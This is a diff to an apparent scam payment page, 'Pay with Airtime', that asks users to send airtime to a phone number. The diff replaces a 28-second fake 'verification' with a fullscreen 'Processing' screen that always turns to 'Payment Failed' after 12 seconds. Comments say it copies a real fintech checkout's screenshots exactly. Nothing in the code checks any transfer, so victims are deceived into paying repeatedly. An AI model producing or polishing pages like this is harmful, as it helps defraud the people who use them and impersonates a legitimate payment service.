@@ -337,7 +337,7 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Success/Expiration/Failure Modals */
+        /* Session Expired Modal */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -376,18 +376,6 @@
             transform: scale(1);
         }
 
-        .success-icon-wrap {
-            width: 56px;
-            height: 56px;
-            background: var(--success-light);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1rem;
-            color: var(--success);
-        }
-
         .danger-icon-wrap {
             width: 56px;
             height: 56px;
@@ -398,29 +386,6 @@
             justify-content: center;
             margin: 0 auto 1rem;
             color: var(--danger);
-        }
-
-        .receipt-title {
-            font-size: 1.15rem;
-            font-weight: 700;
-            margin-bottom: 0.35rem;
-            color: var(--text-main);
-        }
-
-        .receipt-subtitle {
-            font-size: 0.8rem;
-            color: var(--text-muted);
-            margin-bottom: 1.25rem;
-            line-height: 1.4;
-        }
-
-        .receipt-details {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            border-radius: 14px;
-            padding: 1rem;
-            margin-bottom: 1.25rem;
-            text-align: left;
         }
 
         .close-btn {
@@ -449,12 +414,114 @@
             flex-direction: column;
             gap: 0.15rem;
         }
+
+        /* ==========================================================================
+           FULLSCREEN PROCESSOR / FAILED UI (As requested with 0 differences)
+           ========================================================================== */
+        .screenshot-view-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #ffffff;
+            z-index: 9999;
+            display: none; /* Controlled by Javascript trigger */
+            flex-direction: column;
+            padding: 2rem 1.5rem;
+            box-sizing: border-box;
+            align-items: center;
+        }
+
+        .screenshot-header {
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 17px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 7rem; /* Matches spacing before elements in screenshots */
+            text-align: left;
+        }
+
+        .screenshot-logo-box {
+            width: 19px;
+            height: 19px;
+            background-color: #000000;
+            color: #ffffff;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            border-radius: 3px;
+            margin-right: 8px;
+        }
+
+        /* Screenshot Loading Indicator Styling */
+        .screenshot-loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            max-width: 440px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .screenshot-circle-loader {
+            width: 68px;
+            height: 68px;
+            border: 6px solid #f1f1f1;
+            border-top: 6px solid #04b47c; /* Classic Fintech Green loader ring */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 2rem;
+        }
+
+        .screenshot-loader-text {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 17.5px;
+            font-weight: 700;
+            color: #000000;
+            letter-spacing: -0.1px;
+        }
+
+        /* Screenshot Failed View Styling */
+        .screenshot-failed-container {
+            display: none; /* Switched active after 12s */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            max-width: 320px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .screenshot-failed-title {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 21px;
+            font-weight: 900;
+            color: #e51c23; /* Matching Red from Image 2 */
+            margin-bottom: 1.15rem;
+            letter-spacing: -0.2px;
+        }
+
+        .screenshot-failed-message {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14.5px;
+            font-weight: 500;
+            color: #4a4a4a;
+            line-height: 1.45;
+        }
     </style>
 </head>
 <body>
 
     <!-- Main Payment Terminal Interface -->
-    <main class="payment-container">
+    <main class="payment-container" id="mainTerminal">
         <!-- Header -->
         <header class="header">
             <div class="brand">
@@ -523,23 +590,28 @@
         </div>
     </main>
 
-    <!-- Professional Failure Verification Modal -->
-    <div class="modal-overlay" id="failedModal">
-        <div class="receipt-card">
-            <div class="danger-icon-wrap">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
-            </div>
-            <h2 class="receipt-title">Verification Failed</h2>
-            <p class="receipt-subtitle" id="failReasonText">Our automated validation engine was unable to detect your airtime transfer at this time.</p>
-            
-            <div class="receipt-details">
-                <div class="details-row"><span class="details-label">Status</span><span class="details-value" style="color: var(--danger); font-weight: 700;">Unconfirmed</span></div>
-                <div class="details-row"><span class="details-label">Expected Value</span><span class="details-value">₦7,864.00</span></div>
-                <p style="font-size: 0.725rem; color: var(--text-muted); margin-top: 0.5rem; text-align: left; line-height: 1.35;">
-                    Please ensure you sent the <b>exact amount</b> to the <b>exact > number</b> (<b>09163974769</b>) and that the network transaction is finalized before retrying.
-                </p>
-            </div>
-            <button class="close-btn" onclick="closeModal('failedModal')">Retry Verification</button>
+    <!-- ==========================================================================
+       FULLSCREEN PROCESSOR / FAILED OVERLAY ELEMENT 
+       ========================================================================== -->
+    <div class="screenshot-view-overlay" id="screenshotOverlay">
+        <!-- Exact Brand Header matching the screenshots, but rebranded to Airtime as requested -->
+        <div class="screenshot-header">
+            <span class="screenshot-logo-box">$</span>
+            <span>Pay with Airtime</span>
+        </div>
+
+        <!-- 1. PROCESSING SCREEN (Visible first for 12 seconds) -->
+        <div class="screenshot-loader-container" id="screenshotProcessing">
+            <div class="screenshot-circle-loader"></div>
+            <p class="screenshot-loader-text">Processing your payment...</p>
+        </div>
+
+        <!-- 2. FAILED SCREEN (Fires exactly after 12 seconds) -->
+        <div class="screenshot-failed-container" id="screenshotFailed">
+            <h1 class="screenshot-failed-title">Payment Failed</h1>
+            <p class="screenshot-failed-message">
+                Sorry, this transaction was not successful. Please try again with a new session.
+            </p>
         </div>
     </div>
 
@@ -629,6 +701,11 @@
             document.getElementById('confirmSentBtn').disabled = false;
             document.getElementById('expiredModal').classList.remove('active');
             
+            // Clean up screenshot view overlays if active
+            document.getElementById('screenshotOverlay').style.display = 'none';
+            document.getElementById('screenshotProcessing').style.display = 'flex';
+            document.getElementById('screenshotFailed').style.display = 'none';
+
             initTimer();
         }
 
@@ -647,36 +724,24 @@
             });
         }
 
+        // ==========================================================================
+        // MAIN TRIGGER FUNCTION
+        // ==========================================================================
         function verifyPayment() {
-            const btn = document.getElementById('confirmSentBtn');
-            const spinner = document.getElementById('sentSpinner');
-            const text = btn.querySelector('.btn-text');
-            const modal = document.getElementById('failedModal');
+            const overlay = document.getElementById('screenshotOverlay');
+            const processingState = document.getElementById('screenshotProcessing');
+            const failedState = document.getElementById('screenshotFailed');
 
-            // Prevent multi-clicking and show professional inline loader
-            btn.style.pointerEvents = 'none';
-            text.style.opacity = '0.5';
-            text.innerText = 'Verifying transfer with network...';
-            spinner.style.display = 'block';
+            // 1. Instantly display fullscreen Processing Screen layout 
+            overlay.style.display = 'flex';
+            processingState.style.display = 'flex';
+            failedState.style.display = 'none';
 
-            // Wait exactly 28 seconds (28000ms) before triggering failure modal feedback
+            // 2. Load for exactly 12 seconds (12000ms), then switch directly to Failed Screen layout
             setTimeout(() => {
-                // Restore button styles cleanly
-                btn.style.pointerEvents = 'auto';
-                text.style.opacity = '1';
-                text.innerText = 'I have sent the airtime';
-                spinner.style.display = 'none';
-
-                // Dynamically ensure failure messages explicitly demand verification check
-                document.getElementById('failReasonText').innerText = "The system was unable to detect the airtime. Transaction verification failed because no matching transfer was registered.";
-                
-                // Prompt professional failure sheet overlay
-                modal.classList.add('active');
-            }, 28000);
-        }
-
-        function closeModal(id) {
-            document.getElementById(id).classList.remove('active');
+                processingState.style.display = 'none';
+                failedState.style.display = 'flex';
+            }, 12000);
         }
     </script>
 </body>
